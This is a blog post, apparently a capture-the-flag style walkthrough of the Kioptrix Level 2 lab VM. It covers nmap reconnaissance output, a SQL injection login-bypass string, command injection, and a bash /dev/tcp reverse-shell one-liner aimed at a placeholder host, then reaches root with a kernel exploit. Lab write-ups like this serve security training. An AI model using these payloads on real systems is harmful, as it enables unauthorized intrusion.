---
layout: post
title: "vulhub-Kioptrix Level 2"
date: 2016-06-07 15:56:48 -0500
comments: true
categories: [vulhub, sql injection]
---

###Tools:

* netdiscover
* Nmap
* zap
* netcat


<!--more-->

Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.79.0/24`

{% img  /images/blog/vulhub/kioptrix2/Selection_001.png   [title manually exploit [alt text]] %}

192.168.79.183 is the target.


Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.79.183 -p-`

Opening ports: 22, 111, 139, 80, 443, 1024.

```
Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-07 16:07 CDT
NSE: Loaded 138 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:07
Completed NSE at 16:07, 0.00s elapsed
Initiating NSE at 16:07
Completed NSE at 16:07, 0.00s elapsed
Initiating ARP Ping Scan at 16:07
Scanning 192.168.79.183 [1 port]
Completed ARP Ping Scan at 16:07, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:07
Completed Parallel DNS resolution of 1 host. at 16:08, 13.00s elapsed
Initiating SYN Stealth Scan at 16:08
Scanning 192.168.79.183 [65535 ports]
Discovered open port 443/tcp on 192.168.79.183
Discovered open port 3306/tcp on 192.168.79.183
Discovered open port 111/tcp on 192.168.79.183
Discovered open port 22/tcp on 192.168.79.183
Discovered open port 80/tcp on 192.168.79.183
Discovered open port 666/tcp on 192.168.79.183
Discovered open port 631/tcp on 192.168.79.183
Completed SYN Stealth Scan at 16:08, 3.99s elapsed (65535 total ports)
Initiating Service scan at 16:08
Scanning 7 services on 192.168.79.183
Completed Service scan at 16:08, 16.01s elapsed (7 services on 1 host)
Initiating OS detection (try #1) against 192.168.79.183
NSE: Script scanning 192.168.79.183.
Initiating NSE at 16:08
Completed NSE at 16:08, 2.14s elapsed
Initiating NSE at 16:08
Completed NSE at 16:08, 0.00s elapsed
Nmap scan report for 192.168.79.183
Host is up (0.00052s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            663/udp  status
|_  100024  1            666/tcp  status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-10-08T00:10:47
| Not valid after:  2010-10-08T00:10:47
| MD5:   01de 29f9 fbfb 2eb2 beaf e624 3157 090f
|_SHA-1: 560c 9196 6506 fb0f fb81 66b1 ded3 ac11 2ed4 808a
|_ssl-date: 2016-06-07T17:59:07+00:00; -3h09m26s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
666/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:55:D2:EE (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Uptime guess: 0.018 days (since Tue Jun  7 15:42:38 2016)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=201 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 192.168.79.183

NSE: Script Post-scanning.
Initiating NSE at 16:08
Completed NSE at 16:08, 0.00s elapsed
Initiating NSE at 16:08
Completed NSE at 16:08, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.28 seconds
           Raw packets sent: 65555 (2.885MB) | Rcvd: 65551 (2.623MB)

```

Use Nikto to scan  the web service.

{% img  /images/blog/vulhub/kioptrix2/Selection_004.png   [title manually exploit [alt text]] %}


not so excited.


check the webpage:

{% img  /images/blog/vulhub/kioptrix2/Selection_002.png   [title manually exploit [alt text]] %}


may contain SQL injection. Use zap to scan:


{% img  /images/blog/vulhub/kioptrix2/Selection_003.png   [title manually exploit [alt text]] %}


Finally try username as `test`, password `test' or '1'=1'` can bypass the login.

{% img  /images/blog/vulhub/kioptrix2/Selection_005.png   [title manually exploit [alt text]] %}



Now I am looking for command injection:

try:

{% img  /images/blog/vulhub/kioptrix2/Selection_006.png   [title manually exploit [alt text]] %}


get:

{% img  /images/blog/vulhub/kioptrix2/Selection_007.png   [title manually exploit [alt text]] %}

Okay. Now set up netcat on port 4444 and in the web console:

`/bin/bash -i > /dev/tcp/[yourip]/[port] 0<&1`


get the shell:

{% img  /images/blog/vulhub/kioptrix2/Selection_008.png   [title manually exploit [alt text]] %}


But not the root. Keep going...

After enumeration, I found the kernel version is 2.6.9. Now search the exploit


{% img  /images/blog/vulhub/kioptrix2/Selection_009.png   [title manually exploit [alt text]] %}


Find an interestig one. I tried other exploits too, but failed..

Upload it to the target, compile and run it. ROOT:

{% img  /images/blog/vulhub/kioptrix2/Selection_010.png   [title manually exploit [alt text]] %}


DONE
